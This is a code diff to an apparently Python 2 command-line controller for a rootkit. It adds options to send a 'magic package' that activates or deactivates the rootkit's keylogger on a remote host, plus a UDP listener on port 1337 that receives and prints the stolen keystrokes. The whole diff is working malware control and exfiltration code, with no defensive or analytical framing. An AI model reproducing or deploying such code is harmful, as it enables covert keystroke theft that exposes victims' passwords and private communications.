@@ -68,16 +68,33 @@ def get_ip(args):
 
 def print_usage():
     print "usage:", sys.argv[0], "\t[-a key] [-d key] [-h <host>]"
+    print "\t\t\t\t[-u]"
+    print "-a key\t","sends a magic package to the rootkit and activates the keylogger"
+    print "-d key\t","sends a magic package to the rootkit and deactivates the keylogger"
+    print "-h <host>\t", "the ip for the host where the rootkit is running"
+    print "-u", "start a socket to receive the keys from the keylogger"
 
 def is_admin():
     if not os.geteuid()==0:
-        sys.exit("\nYou must be root to run this application, please use sudo and try again.\n")  
+        sys.exit("\nYou must be root to run the application with this option, please use sudo and try again.\n")  
 
+def getNetworkIp():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(('google.at', 0))
+    return s.getsockname()[0]
 
-is_admin()
+def start_socket(port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    server_address = (getNetworkIp(), port)
+    sock.bind(server_address)
+    print "UPD Server is waiting for messages on port:", port
+    while True:
+        data, address = sock.recvfrom(3)
+        print data
 code = 0
 host = ""
-options, remainder =  getopt.getopt(sys.argv[1:], 'a:d:h:',[])
+start_udp_socket = False
+options, remainder =  getopt.getopt(sys.argv[1:], 'a:d:h:u',[])
 if len(sys.argv) != 1:
     for opt, arg in options:
         if opt == "-a" and arg == "key":
@@ -86,7 +103,14 @@ if len(sys.argv) != 1:
             code = ROOTKIT_KEYLOGGER_DEACTIVATE
         elif opt == "-h":
             host = arg
-    send_message(host, code)
+        elif opt == "-u":
+            start_udp_socket = True
+
+    if start_udp_socket:
+        start_socket(1337)
+    else:
+        is_admin()
+        send_message(host, code)
 else:
     print_usage()
 
